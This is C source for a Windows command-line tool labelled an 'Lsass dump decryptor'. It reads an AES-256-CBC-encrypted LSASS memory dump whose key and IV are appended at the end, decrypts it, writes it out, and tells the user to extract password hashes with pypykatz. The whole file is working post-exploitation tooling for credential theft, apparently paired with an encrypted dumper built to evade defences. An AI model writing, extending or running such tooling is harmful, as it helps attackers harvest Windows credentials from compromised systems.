#include <Windows.h>
#include <stdio.h>

#include "AES.h"

BOOL FetchAesConfAndDecrypt(IN PBYTE pPayloadBuffer, IN OUT SIZE_T* sPayloadSize, OUT PBYTE* ppDecryptedPayload) {

	BOOL			bResult = FALSE;
	AES256_CBC_ctx	CtAesCtx = { 0 };
	BYTE			pAesKey[KEY_SIZE] = { 0 };
	BYTE			pAesIv[IV_SIZE] = { 0 };
	ULONG_PTR		uAesKeyPtr = NULL,
		uAesIvPtr = NULL;

	uAesKeyPtr = ((pPayloadBuffer + *sPayloadSize) - (KEY_SIZE + IV_SIZE));
	uAesIvPtr = ((pPayloadBuffer + *sPayloadSize) - IV_SIZE);

	memcpy(pAesKey, uAesKeyPtr, KEY_SIZE);
	memcpy(pAesIv, uAesIvPtr, IV_SIZE);

	// Updating the payload size
	*sPayloadSize = *sPayloadSize - (KEY_SIZE + IV_SIZE);

	// Decrypting
	AES256_CBC_init(&CtAesCtx, pAesKey, pAesIv);
	if (!AES256_CBC_decrypt(&CtAesCtx, pPayloadBuffer, *sPayloadSize, ppDecryptedPayload))
		goto _FUNC_CLEANUP;

	bResult = TRUE;

_FUNC_CLEANUP:
	HeapFree(GetProcessHeap(), 0x00, pPayloadBuffer);	// Free allocated heap in 'GetResourcePayload' function
	return bResult;
}


BOOL ReadPayloadFile(IN LPCSTR cFileName, OUT PBYTE* ppFileBuffer, OUT PDWORD pdwFileSize) {

	HANDLE	hFile = INVALID_HANDLE_VALUE;
	PBYTE	pTmpReadBuffer = NULL;
	DWORD	dwFileSize = 0x00,
		dwNumberOfBytesRead = 0x00;

	if (!pdwFileSize || !ppFileBuffer)
		return FALSE;

	if ((hFile = CreateFileA(cFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
		printf("\t[!] CreateFileA Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	if ((dwFileSize = GetFileSize(hFile, NULL)) == INVALID_FILE_SIZE) {
		printf("\t[!] GetFileSize Failed With Error: %d \n", GetLastError());
		goto _FUNC_CLEANUP;
	}


	if ((pTmpReadBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize)) == NULL) {
		printf("HeapAlloc");
		goto _FUNC_CLEANUP;

	}

	if (!ReadFile(hFile, pTmpReadBuffer, dwFileSize, &dwNumberOfBytesRead, NULL) || dwFileSize != dwNumberOfBytesRead) {
		printf("\t[!] ReadFile Failed With Error: %d \n", GetLastError());
		printf("\t[i] ReadFile Read %d Of %d Bytes \n", dwNumberOfBytesRead, dwFileSize);
		goto _FUNC_CLEANUP;
	}

	*ppFileBuffer = pTmpReadBuffer;
	*pdwFileSize = dwFileSize;

_FUNC_CLEANUP:
	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);
	if (pTmpReadBuffer && !*ppFileBuffer)
		FREE(pTmpReadBuffer);
	return *ppFileBuffer == NULL ? FALSE : TRUE;
}

BOOL WritePayloadFile(IN PBYTE pFileBuffer, IN DWORD dwFileSize) {

	HANDLE	hFile = INVALID_HANDLE_VALUE;
	DWORD	dwNumberOfBytesWritten = 0x00;

	if (!pFileBuffer || !dwFileSize)
		return FALSE;

	if ((hFile = CreateFileA(NEW_NAME, GENERIC_ALL, 0x00, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
		printf("\t[!] CreateFileA Failed With Error: %d \n", GetLastError());
		goto _FUNC_CLEANUP;
	}

	if (!WriteFile(hFile, pFileBuffer, dwFileSize, &dwNumberOfBytesWritten, NULL) || dwFileSize != dwNumberOfBytesWritten) {
		printf("\t[!] WriteFile Failed With Error: %d \n", GetLastError());
		printf("\t[i] WriteFile Wrote %d Of %d Bytes \n", dwNumberOfBytesWritten, dwFileSize);
		goto _FUNC_CLEANUP;
	}



_FUNC_CLEANUP:
	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);
	return dwNumberOfBytesWritten == dwFileSize ? TRUE : FALSE;
}

int main(int argc, char* argv[]) {

	PBYTE	pPlainText = NULL,
		pCipherText = NULL,
		pCipherTextWithConfig = NULL;
	SIZE_T	sPlainTextSize = NULL,
		sCipherTextSize = NULL;

	BYTE	pAesKey[KEY_SIZE] = { 0 };
	BYTE	pAesIv[IV_SIZE] = { 0 };
	PBYTE		pDecryptedPayload = NULL;


	printf(" \t\n============ Lsass dump decryptor by Jim ============ \t\n");
	if (argc != 2) {

		printf("\n[!] Please Input lsass dump File To dncrypt\n");
		return -1;
	}



	printf("\n[i] Reading %s From The Disk ... ", argv[1]);

	if (!ReadPayloadFile(argv[1], &pPlainText, &sPlainTextSize)) {
		return -1;
	}
	printf("\n[+] DONE\n");

	FetchAesConfAndDecrypt(pPlainText, &sPlainTextSize, &pDecryptedPayload);


	if (!WritePayloadFile(pDecryptedPayload, sPlainTextSize)) {

		printf("[!] WritePayloadFile  Failed with error: %d\n", GetLastError());
		//printf("[!] Wrote %d of %d Bytes\n", dwNumberOfbytesWritten, sPlainTextSize);

	}

	printf("[!] Wrote %s of %d Bytes\n", NEW_NAME, sPlainTextSize);
	printf("Extract hashes using:\npypykatz lsa minidump %s\n", NEW_NAME);

}